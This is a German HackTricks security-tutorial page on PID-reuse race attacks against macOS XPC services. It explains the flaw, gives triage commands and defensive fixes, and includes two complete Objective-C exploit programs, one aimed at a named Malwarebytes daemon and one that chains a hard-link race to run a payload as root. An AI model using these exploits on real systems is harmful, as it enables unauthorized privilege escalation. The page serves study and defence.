# macOS PID-Reuse

{{#include ../../../../../../banners/hacktricks-training.md}}

## PID-Reuse

Wenn ein **XPC service** einen Aufrufer authentifiziert, indem es dessen **PID** auflöst, anstatt auf an die empfangene Nachricht gebundene Credentials zurückzugreifen, kann es für einen PID-Reuse-Angriff anfällig sein. Das praktische Primitive besteht nicht darin, auf einen Überlauf des PID-Namensraums zu warten: Der Angreifer sendet eine XPC-Anfrage und ruft unmittelbar **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** mit `POSIX_SPAWN_SETEXEC` auf, wodurch das Prozessabbild des Angreifers durch ein **zulässiges Binary ersetzt wird, während die PID erhalten bleibt**.<sup>[[1]](#references)[[2]](#references)</sup>

Wenn der Server die Anfrage aus der Warteschlange entfernt und erst danach diese numerische PID zu einem laufenden Prozess für Code-Signing-, Entitlement-, Pfad- oder Elternprozess-Prüfungen auflöst, sieht er das Ersatz-Binary statt des Prozesses, der die Nachricht gesendet hat. `POSIX_SPAWN_START_SUSPENDED` hält den vertrauenswürdigen Ersatz am Leben und stabil, während der Server die Prüfung durchführt.<sup>[[1]](#references)[[2]](#references)</sup>

### Was tatsächlich in Konkurrenz steht

Die verwundbare Abfolge ist ein **Message-Identity-TOCTOU** und nicht einfach „PIDs können sich wiederholen“:<sup>[[1]](#references)[[2]](#references)</sup>

1. Ein Angreiferprozess stellt eine XPC-Verbindung her oder setzt sie fort und reiht die privilegierte Anfrage ein.
2. Bevor der Service die PID der Verbindung in eine `SecCodeRef` oder ein anderes Prozessobjekt umwandelt, überlagert der Angreifer denselben Prozess mithilfe von `POSIX_SPAWN_SETEXEC` mit einer genehmigten ausführbaren Datei.
3. Der Service validiert das aktuell an diese PID gebundene genehmigte Abbild und verarbeitet anschließend die bereits eingereihte, vom Angreifer kontrollierte Anfrage.

Jede PID-Überbrückung in einem Autorisierungsdatenfluss ist verdächtig: `-[NSXPCConnection processIdentifier]`, `xpc_connection_get_pid` oder `audit_token_to_pid`, gefolgt von `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`, `proc_pidpath`, `NSRunningApplication(processIdentifier:)` oder einem benutzerdefinierten Signature-Verifier. Eine PID, die nur für Logging verwendet wird, reicht nicht aus; bestätige, dass sie die Allow/Deny-Entscheidung erreicht. Untersuche auch Fehlerpfade: Wenn zunächst eine Audit-Token-Suche versucht wird, bei einem Fehler aber **auf die PID zurückgefallen wird**, wird derselbe Race wiederhergestellt. Dieses Fallback-Muster trat in einer Analyse der privilegierten XPC services von Intego aus dem Jahr 2026 auf.<sup>[[3]](#references)</sup>

### Schnelle statische und dynamische Triage

Beginne beim Connection-Handler und verfolge jeden PID-erzeugenden Aufruf bis zu Code-Signing-, Entitlement-, ausführbaren-Pfad- oder Versionsprüfungen. Diese Befehle ermöglichen einen schnellen ersten Durchlauf bei einem verdächtigen Helper; auch gestrippte Binaries enthalten häufig weiterhin importierte Symbole, Objective-C-Selektoren oder diagnostische Strings:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
Während eines kontrollierten Tests sollten sowohl die PID-Quelle als auch deren Verifizierer gebrochen oder gehookt werden. Ein Treffer bei `xpc_connection_get_pid` oder `-processIdentifier` ist nur ein Hinweis; die nützlichen Beweise liefert eine spätere Abfrage derselben Ganzzahl, nachdem die Anfrage empfangen wurde. Frida kann zusätzlich den anwendungsspezifischen Verifizierer und den privilegierten Selector hooken, um zu messen, ob der Selector ausgeführt wird, wenn die PID-Race erfolgreich ist.<sup>[[3]](#references)</sup>

### Exploit-Beispiel

Wenn du die Funktion **`shouldAcceptNewConnection`** oder eine von ihr aufgerufene Funktion findest, die **`processIdentifier`** aufruft und **`auditToken`** nicht aufruft, bedeutet das höchstwahrscheinlich, dass sie die Prozess-PID und nicht das Audit-Token **verifiziert**.\
Wie zum Beispiel in diesem Bild (aus der Referenz):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Sieh dir dieses Exploit-Beispiel an (ebenfalls aus der Referenz), um die zwei Teile des Exploits zu sehen:<sup>[[1]](#references)</sup>

- Eines, das mehrere Forks **erzeugt**
- **Jeder Fork** wird den **Payload** an den XPC service **senden**, während direkt nach dem Senden der Nachricht **`posix_spawn`** ausgeführt wird.

> [!CAUTION]
> Beim Racen mit `fork()` aus einem Objective-C-Prozess heraus solltest du den Exploit mit exportiertem `OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` starten oder den Marker `__objc_fork_ok` einbetten:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
Die erste Option verwendet **`NSTasks`** und ein Argument, um die Children zu starten und die RC-vesm
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
Dieses Beispiel verwendet ein rohes **`fork`**, um **Kinderprozesse zu starten, die die PID-Race-Condition ausnutzen**, und anschließend eine **weitere Race-Condition über einen Hard Link auszunutzen:**
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## Den Race reproduzierbar machen

Die folgenden Optimierungspunkte treten bei funktionierenden PID-reuse-Exploits und aktuellen Tests privilegierter Helfer wiederholt auf:<sup>[[1]](#references)[[3]](#references)</sup>

- Sende die Anfrage und rufe `posix_spawn` sofort auf; **warte nicht** auf die Antwort. Die Anfrage muss bereits in die Warteschlange eingereiht sein, während die PID-Suche des Servers nach dem Ersetzen des Images erfolgt.
- Verwende `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED` gemeinsam. Das erste Flag bewahrt die PID des konkurrierenden Prozesses; das zweite verhindert, dass das gültige Ziel vor der Validierung beendet wird oder seinen Zustand ändert.
- Verwende mehrere kurzlebige Racer und wiederhole die vollständige Verbindungs-/Anfrage-/Exec-Sequenz. Die optimale Anzahl hängt vom Ziel ab; zu viele Child-Prozesse können den Service verlangsamen und das Zeitfenster verschlechtern.
- Der Ersatz muss die **gesamte** Anforderung des Servers erfüllen. Verwende nach Möglichkeit die legitime Client-Binary erneut und prüfe zuerst deren designated requirement mit `codesign -d -r- "/path/to/client.app"`.
- Rufe zuerst einen harmlosen exportierten Selector oder eine schreibgeschützte Methode auf. Dadurch lässt sich die erfolgreiche Authentifizierung von der erfolgreichen Ausnutzung eines späteren privilegierten Primitives unterscheiden.

## Die PID-Brücke vermeiden

Unter macOS 13+ stellt Foundation `-[NSXPCConnection setCodeSigningRequirement:]` bereit. Setze die Peer-Anforderung genau einmal und **vor** `resume`; fehlerhafte Anforderungszeichenfolgen lösen eine Exception (oder in Swift einen fatal error) aus, und eine Nachricht von einem Peer, der die Anforderung nicht erfüllt, macht die Verbindung ungültig. Dadurch kann XPC die Code-Identität des Peers durchsetzen, ohne dass der Anwendungscode eine PID auflösen muss.<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
Für die moderne Low-Level-Listener-API ab macOS 26 wendet `xpc_listener_set_peer_requirement` eine validierte `xpc_peer_requirement_t` an, während der Listener inaktiv ist. XPC verwirft Anfragen, die diese Anforderung nicht erfüllen; vom Listener erstellte Peer-Sitzungen übernehmen sie **nicht**, daher sollte zusätzlich eine passende Sitzungsanforderung angewendet werden, wenn diese Sitzungen privilegierte Operationen autorisieren.<sup>[[7]](#references)</sup>

> [!WARNING]
> Versuche nicht, dies zu „beheben“, indem du ein Audit-Token kopierst und es anschließend für die eigentliche `SecCode`-Suche wieder in eine PID umwandelst. Behalte die aus dem Audit-Token abgeleitete Identität während der Autorisierungsentscheidung bei oder verwende durchgehend eine XPC-Peer-Requirement-API.<sup>[[2]](#references)[[6]](#references)</sup> Die verbindungsweiten Audit-Token-APIs weisen außerdem eine eigene Race-Klasse auf, die unter [macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md) behandelt wird.

## Weitere Beispiele

- [**Intego X9: Warum dein macOS-Antivirus PIDs nicht vertrauen sollte**](https://blog.quarkslab.com/intego_lpe_macos_2.html) – LPE gegen den privilegierten Helper eines AV, der Clients anhand ihrer PID authentifizierte.<sup>[[3]](#references)</sup>
- [**Ausnutzung des GOG-Galaxy-XPC-Service zur Rechteausweitung in macOS**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Teil II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [XPC exploitation lernen – Teil 2: Sag Nein zur PID!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [Vertraue der PID nicht! Geschichten über einen einfachen Logikfehler und wo man ihn findet – Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: Warum dein macOS-Antivirus PIDs nicht vertrauen sollte](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [Ausnutzung des GOG-Galaxy-XPC-Service zur Rechteausweitung in macOS](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Teil II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
